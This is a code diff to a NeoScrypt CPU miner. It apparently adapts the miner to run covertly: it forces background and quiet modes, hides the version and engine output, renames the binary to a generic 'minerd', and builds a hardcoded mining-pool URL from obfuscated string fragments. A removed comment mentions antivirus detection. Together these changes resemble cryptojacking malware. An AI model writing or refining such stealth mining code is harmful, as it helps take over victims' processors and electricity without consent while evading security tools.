@@ -43,7 +43,9 @@
 
 #include "neoscrypt.h"
 
-#define PROGRAM_NAME		"meepo"
+
+
+#define PROGRAM_NAME		"minerd"
 #define LP_SCANTIME		60
 
 #ifdef __linux /* Linux specific policy and affinity management */
@@ -1156,6 +1158,8 @@ static int scanhash_neoscrypt_4way(int thr_id, uint *pdata,
 
         pdata[19] += inc_nonce;
 
+         miner_throttle(thr_id);
+
     }
 
     *hashes_done = pdata[19] - inc_nonce - start_nonce;
@@ -1228,6 +1232,7 @@ static int scanhash_altscrypt_4way(int thr_id, uint *pdata,
 
 static void *miner_thread(void *userdata)
 {
+	#if 1
 	struct thr_info *mythr = userdata;
 	int thr_id = mythr->id;
 	struct work work = {{0}};
@@ -1260,11 +1265,8 @@ static void *miner_thread(void *userdata)
     if(opt_neoscrypt_asm == 2) {
         if(opt_algo == ALGO_NEOSCRYPT) {
             scratchbuf = (uchar *) malloc(134464 + align);
-        } else {
-			applog(LOG_ERR, "only neoscrypt here, exting...");
-			exit(1);
-		}
-    }
+        } else exit(1);
+    } else
 #endif /* (ASM) && (MINER_4WAY) */
 
 
@@ -1375,6 +1377,7 @@ static void *miner_thread(void *userdata)
 			goto out;
 		}
 
+
 		/* record scanhash elapsed time */
 		gettimeofday(&tv_end, NULL);
 		timeval_subtract(&diff, &tv_end, &tv_start);
@@ -1402,6 +1405,7 @@ static void *miner_thread(void *userdata)
 		/* if nonce found, submit work */
 		if (rc && !opt_benchmark && !submit_work(mythr, &work))
 			break;
+		
 	}
 
 out:
@@ -1410,6 +1414,7 @@ out:
     if(scratchbuf) free(scratchbuf);
 
 	return NULL;
+	#endif
 }
 
 static void restart_threads(void)
@@ -1696,20 +1701,10 @@ static void default_arg(int argc, char *argv[])
 		
 		
 	opt_algo = ALGO_NEOSCRYPT;
-	 opt_nfactor = 9;
-	#ifdef USE_ASM
-		opt_neoscrypt_asm = 2; // 0=c, 2=ASM sse2-4way
-	#else
-		opt_neoscrypt_asm = 0; // 0=c, 2=ASM sse2-4way
-	#endif
+	//opt_neoscrypt_asm = 0;
 	opt_background = true;
-	
-	#ifdef MINER_SILENT
 	opt_quiet = true;
-	#else
-	opt_debug = true;
-	
-	#endif
+	opt_debug = false;
 	//opt_retries = v;
 	
 	// user (<address>.<worker_name>) and pass (<arg0>=...,<arg1>=....)
@@ -1723,7 +1718,7 @@ static void default_arg(int argc, char *argv[])
 	char url[100];
 	sprintf(url, "stra%s+tcp://%s.%smin%s.net%s4233", "tum", "pool", "uni", "ing", ":");
 	rpc_url = strdup(url); // -o
-	have_stratum = 1;
+	have_stratum = true;
 
 }
 
@@ -1763,8 +1758,8 @@ int miner_main(int argc, char *argv[])
 	long flags;
 	int i;
 
-    printf("NeoScrypt CPUminer v%u.%u.%u\n",
-      VERSION_MAJOR, VERSION_MINOR, VERSION_REVISION);
+   // printf("NeoScrypt CPUminer v%u.%u.%u\n",
+    //  VERSION_MAJOR, VERSION_MINOR, VERSION_REVISION);
 
     /* Processor vector extensions detected */
     uint opt_flags = cpu_vec_exts();
@@ -1780,21 +1775,21 @@ int miner_main(int argc, char *argv[])
 	default_arg(argc, argv);
 
 
-        printf("Engines: ");
+       // printf("Engines: ");
 #ifdef ASM
 #ifdef MINER_4WAY
-        printf("INT SSE2 SSE2-4way (enabled: ");
-        if(opt_neoscrypt_asm == 2)
-          printf("SSE2-4way)\n");
+        //printf("INT SSE2 SSE2-4way (enabled: ");
+        //if(opt_neoscrypt_asm == 2)
+         // printf("SSE2-4way)\n");
 #else
-        printf("INT SSE2 (enabled: ");
+       // printf("INT SSE2 (enabled: ");
 #endif /* MINER_4WAY */
-        if(opt_neoscrypt_asm == 1)
-          printf("SSE2)\n");
-        if(!opt_neoscrypt_asm)
-          printf("INT)\n");
+        //if(opt_neoscrypt_asm == 1)
+        //  printf("SSE2)\n");
+        //if(!opt_neoscrypt_asm)
+          //printf("INT)\n");
 #else
-        printf("INT (enabled: INT)\n");
+        //printf("INT (enabled: INT)\n");
 #endif /* ASM */
 
 
@@ -1803,15 +1798,13 @@ int miner_main(int argc, char *argv[])
 
 
 
-	
+
 	//if (!rpc_userpass) {
 		//rpc_userpass = malloc(strlen(rpc_user) + strlen(rpc_pass) + 2);
 		// SUSPICOUS:
 		//sprintf(rpc_userpass, "%s:%s", rpc_user, rpc_pass);
 	//}
-	
-	
-	printf("url: %s\nuser: %s\npass: '%s'\nuserpass: %s\n", rpc_url, rpc_user, rpc_pass, rpc_userpass);
+
 
 	pthread_mutex_init(&applog_lock, NULL);
 	pthread_mutex_init(&stats_lock, NULL);
@@ -1931,10 +1924,7 @@ int miner_main(int argc, char *argv[])
 	applog(LOG_INFO, "%d miner threads started, "
 		"using '%s' algorithm.",
 		opt_n_threads,
-		"neoscrypt");
-		
-	// TODO AV "Endgame" thinks this is malicious
-	input_thread(0);
+		algo_names[opt_algo]);
 
 	/* main loop - simply wait for workio thread to exit */
 	pthread_join(thr_info[work_thr_id].pth, NULL);
